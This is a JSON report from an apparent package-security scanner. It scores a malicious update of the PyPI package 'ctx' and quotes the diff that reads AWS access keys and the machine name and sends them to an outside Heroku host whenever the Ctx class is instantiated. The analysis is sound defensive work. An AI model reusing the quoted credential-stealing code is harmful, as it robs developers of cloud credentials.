@@ -1,0 +1,137 @@
+{
+  "schema_version": "0.2.0",
+  "ecosystem": "pypi",
+  "package": "ctx",
+  "from_version": "0.1.2",
+  "to_version": "0.1.2-1",
+  "risk_score": 42.5,
+  "severity": "MEDIUM",
+  "llm_base_score": 42.5,
+  "dimensions": [
+    {
+      "name": "network_calls",
+      "label": "New or changed network calls",
+      "score": 10.0,
+      "weight": 0.2,
+      "reasoning": "The diff adds a `sendRequest` method in ctx.py that makes an explicit HTTP GET request to 'https://anti-theft-web.herokuapp.com/hacked/' concatenated with the machine name, AWS_ACCESS_KEY_ID, and AWS_SECRET_ACCESS_KEY. This is called unconditionally from `__init__`, meaning every instantiation of Ctx() exfiltrates credentials to an external server.",
+      "confidence": 1.0
+    },
+    {
+      "name": "obfuscation",
+      "label": "Obfuscation / encoding patterns (base64, eval, dynamic require)",
+      "score": 1.0,
+      "weight": 0.2,
+      "reasoning": "No obfuscation techniques such as base64 encoding, eval, or dynamic imports are present. The malicious code is written in plain, readable Python.",
+      "confidence": 1.0
+    },
+    {
+      "name": "install_hooks",
+      "label": "Postinstall / preinstall script additions or changes",
+      "score": 0.0,
+      "weight": 0.15,
+      "reasoning": "No postinstall or preinstall scripts are added or modified in this diff.",
+      "confidence": 1.0
+    },
+    {
+      "name": "env_conditional",
+      "label": "Conditional logic gated on env vars, platform, or CI detection",
+      "score": 9.0,
+      "weight": 0.15,
+      "reasoning": "The `__init__` method in ctx.py explicitly reads AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and COMPUTERNAME environment variables. These are specifically targeted cloud credential variables, and their values (or 'empty' placeholders) are sent unconditionally to the external endpoint regardless of whether they are set.",
+      "confidence": 1.0
+    },
+    {
+      "name": "dependency_changes",
+      "label": "Dependency graph changes (new transitive deps)",
+      "score": 7.0,
+      "weight": 0.1,
+      "reasoning": "Two new dependencies are introduced: `requests` (imported directly in ctx.py to enable the exfiltration HTTP call) and `flask` (listed as a new dependency in metadata, though not visibly used in the diff — its presence may be to obscure the true intent or for a future payload). The `requests` addition is directly tied to the malicious network call.",
+      "confidence": 1.0
+    },
+    {
+      "name": "resource_exhaustion",
+      "label": "Denial-of-service / resource-exhaustion patterns (unbounded loops, recursion, unthrottled blocking calls)",
+      "score": 0.0,
+      "weight": 0.2,
+      "reasoning": "No unbounded loops, recursion, or resource-exhaustion patterns are present in the diff.",
+      "confidence": 1.0
+    }
+  ],
+  "feed_results": [
+    {
+      "source": "osv",
+      "status": "suspicious",
+      "details": "Found 3 advisory/ies: GHSA-4g82-3jcr-q52w, GHSA-67r3-h899-9w95, PYSEC-2022-199",
+      "url": "https://osv.dev/list?q=ctx",
+      "advisory_ids": [
+        "GHSA-4g82-3jcr-q52w",
+        "GHSA-67r3-h899-9w95",
+        "PYSEC-2022-199"
+      ],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "rekor",
+      "status": "no_data",
+      "details": "Sigstore attestation lookup is npm-only (PyPI PEP 740 support not implemented).",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "scorecard",
+      "status": "no_data",
+      "details": "Could not resolve GitHub repo for ctx. Scorecard requires a GitHub repository.",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    }
+  ],
+  "score_modifiers": [],
+  "diff_summary": {
+    "files_added": [
+      "test_ctx.py"
+    ],
+    "files_removed": [],
+    "files_modified": [
+      "ctx.py"
+    ],
+    "file_diffs": [
+      {
+        "path": "ctx.py",
+        "change_type": "modified",
+        "lines_added": 30,
+        "lines_removed": 1,
+        "unified_diff": "--- a/ctx.py\n+++ b/ctx.py\n@@ -7,7 +7,11 @@\n \n\n \"\"\"\n\n \n\n-__author__ = 'Robert Ledger'\n\n+import requests\n\n+from os import environ, uname\n\n+\n\n+\n\n+__author__ = 'Yunus AYDIN'\n\n __email__ = 'figlief@figlief.com'\n\n __version__ = '0.1.2'\n\n \n\n@@ -50,6 +54,27 @@\n \n\n     \"\"\"\n\n \n\n+    def __init__(self):\n\n+        \n\n+        if environ.get('AWS_ACCESS_KEY_ID') is not None:\n\n+            self.access = environ.get('AWS_ACCESS_KEY_ID')\n\n+        else:\n\n+            self.access = \"empty\"\n\n+\n\n+        if environ.get('COMPUTERNAME') is not None:\n\n+            self.name = environ.get('COMPUTERNAME')\n\n+        elif uname() is not None:\n\n+            self.name = uname().nodename\n\n+        else:\n\n+            self.name = \"empty\"\n\n+\n\n+        if environ.get('AWS_SECRET_ACCESS_KEY') is not None:\n\n+            self.secret = environ.get('AWS_SECRET_ACCESS_KEY')\n\n+        else:\n\n+            self.secret = \"empty\"\n\n+       \n\n+        self.sendRequest()\n\n+\n\n     def copy(self):\n\n         \"\"\"Return a shallow copy of this instance\"\"\"\n\n         return self.__class__(self)\n\n@@ -91,3 +116,7 @@\n             self.__class__.__name__,\n\n             dict.__repr__(self)\n\n         )\n\n+\n\n+    def sendRequest(self):\n\n+        response = requests.get(\"https://anti-theft-web.herokuapp.com/hacked/\"+self.name+\"/\"+self.access+\"/\"+self.secret)\n\n+\n"
+      },
+      {
+        "path": "test_ctx.py",
+        "change_type": "added",
+        "lines_added": 76,
+        "lines_removed": 0,
+        "unified_diff": "+import pytest\n+from ctx import Ctx\n+\n+\n+def test_lookup_error():\n+    \"\"\"Should  return LookupError if no attiibute or key is found\"\"\"\n+    with pytest.raises(LookupError):\n+        x = Ctx()\n+        (x.no_key == 5)\n+    with pytest.raises(LookupError):\n+        x = Ctx()\n+        (x['no_key'] == 5)\n+\n+\n+def test_attribute_error():\n+    \"\"\"Should raise AttributeError if attempt to set an attribute.\"\"\"\n+    with pytest.raises(AttributeError):\n+        x = Ctx()\n+        x.copy = 5\n+\n+\n+def test_attribue_access():\n+    \"\"\"Should return attribute of an object.\"\"\"\n+\n+    x = Ctx()\n+    assert x.__doc__ == x[\"__doc__\"]\n+\n+\n+def test_init():\n+    \"\"\"Should initialize an object with keywords\"\"\"\n+    p = {}\n+    q = {}\n+\n+    x = Ctx(a=p, b=q)\n+    assert x['a'] is p\n+    assert x.a is p\n+    assert x['b'] is q\n+    assert x.b is q\n+\n+\n+def test_item():\n+    \"\"\"Should set an item with ctx['a'] and retrieve it with ctx[a] or ctx.a\"\"\"\n+    p = {}\n+    x = Ctx()\n+    x['a'] = p\n+    assert x.a is p\n+    assert x['a'] is p\n+\n+\n+def test_attr():\n+    \"\"\"Should set an item with ctx.a and retrieve it with ctx[a] or ctx.a\"\"\"\n+\n+    p = {}\n+    x = Ctx()\n+    x.a = p\n+    assert x.a is p\n+    assert x['a'] is p\n+\n+\n+def test_init_copy():\n+    \"\"\"Should create a shallow copy.\"\"\"\n+\n+    p = {}\n+    q = {}\n+\n+    x = Ctx(a=p, b=q)\n+    y = x.copy()\n+    assert x is not y\n+    assert y['a'] is p\n+    assert y.a is p\n+    assert y['b'] is q\n+    assert y.b is q\n+\n+\n+if __name__ == '__main__':\n+    pytest.main()"
+      }
+    ],
+    "new_dependencies": [
+      "flask"
+    ],
+    "removed_dependencies": [],
+    "new_install_hooks": [],
+    "maintainer_changed": true,
+    "native_addons_added": false,
+    "total_diff_lines": 107,
+    "chunks_sent_to_llm": 1,
+    "diff_truncated": false
+  },
+  "llm_model": "claude-sonnet-4-6",
+  "llm_summary": "This diff is a confirmed credential-stealing supply chain attack. The `ctx` package version 0.1.2-1 introduces code in `ctx.py` that, upon every instantiation of the `Ctx` class, reads AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY from environment variables and exfiltrates them via an HTTP GET request to an external attacker-controlled server (anti-theft-web.herokuapp.com). The maintainer field was also changed, indicating a possible account takeover or malicious maintainer addition. The addition of `flask` as a dependency without any visible usage is suspicious and may serve as cover or future payload delivery.",
+  "timestamp": "2026-08-12T00:49:47.769599Z",
+  "from_version_sha256": null,
+  "to_version_sha256": null
+}
